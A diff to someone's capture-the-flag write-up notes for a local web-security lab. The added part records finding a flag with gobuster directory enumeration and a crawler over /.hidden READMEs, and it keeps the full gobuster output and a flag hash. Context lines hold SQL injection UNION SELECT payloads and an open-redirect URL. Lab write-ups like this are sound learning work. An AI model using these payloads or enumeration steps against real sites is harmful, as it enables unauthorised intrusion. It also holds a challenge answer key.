@@ -16,7 +16,7 @@ vulnerable to sql injections we assume
 5 UNION SELECT COUNT(_), NULL FROM users --
 5 UNION SELECT COUNT(_), first_name FROM users --
 
-THIS LISTS ALL TABLE NAMES
+this lists all table names
 
 ```
 6 UNION SELECT NULL, table_name FROM information_schema.tables--
@@ -300,34 +300,60 @@ http://localhost:8080/index.php?page=redirect&site=ifoundavulnerability
 
 and we get a flag
 
+## FLAG 12 d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
+
+gobuster gave us robots.txt
+which says to hid /whatever (already got the flag there) and /.hidden
+
+there is a bunch of files and dir in /.hidden
+
+tried to see if there was any meaning to the names of the dir and files but nothing
+all files have a readme which taunts us like "Try again"
+
+so we need to make a crawler, which we do and search for keyword flag and it works the first time, we could also have just removed all the few special messages
+in the other readmes, or search by size but flag works
+
+and we get
+
+```
+Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
+```
+
+in http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README
+
 ### TO NOTE
 
 ➜ utenret gobuster dir -u http://localhost:8080/ -w KaliLists/dirb/big.txt -b 200,975
 
 ```
+➜  darklyProject git:(master) ✗ gobuster dir -u http://localhost:8080/ -w ../KaliLists/dirb/big.txt --exclude-length 975
+
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url: http://localhost:8080/
-[+] Method: GET
-[+] Threads: 10
-[+] Wordlist: KaliLists/dirb/big.txt
-[+] Negative Status codes: 200,975
-[+] User Agent: gobuster/3.6
-[+] Timeout: 10s
+[+] Url:                     http://localhost:8080/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                ../KaliLists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          975
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/admin (Status: 301) [Size: 193] [--> http://localhost/admin/]
-/audio (Status: 301) [Size: 193] [--> http://localhost/audio/]
-/css (Status: 301) [Size: 193] [--> http://localhost/css/]
-/errors (Status: 301) [Size: 193] [--> http://localhost/errors/]
-/fonts (Status: 301) [Size: 193] [--> http://localhost/fonts/]
-/images (Status: 301) [Size: 193] [--> http://localhost/images/]
-/includes (Status: 301) [Size: 193] [--> http://localhost/includes/]
-/js (Status: 301) [Size: 193] [--> http://localhost/js/]
-/whatever (Status: 301) [Size: 193] [--> http://localhost/whatever/]
+/admin                (Status: 301) [Size: 193] [--> http://localhost/admin/]
+/audio                (Status: 301) [Size: 193] [--> http://localhost/audio/]
+/css                  (Status: 301) [Size: 193] [--> http://localhost/css/]
+/errors               (Status: 301) [Size: 193] [--> http://localhost/errors/]
+/favicon.ico          (Status: 200) [Size: 1406]
+/fonts                (Status: 301) [Size: 193] [--> http://localhost/fonts/]
+/images               (Status: 301) [Size: 193] [--> http://localhost/images/]
+/includes             (Status: 301) [Size: 193] [--> http://localhost/includes/]
+/js                   (Status: 301) [Size: 193] [--> http://localhost/js/]
+/robots.txt           (Status: 200) [Size: 53]
+/whatever             (Status: 301) [Size: 193] [--> http://localhost/whatever/]
 Progress: 20469 / 20470 (100.00%)
 ===============================================================
 Finished
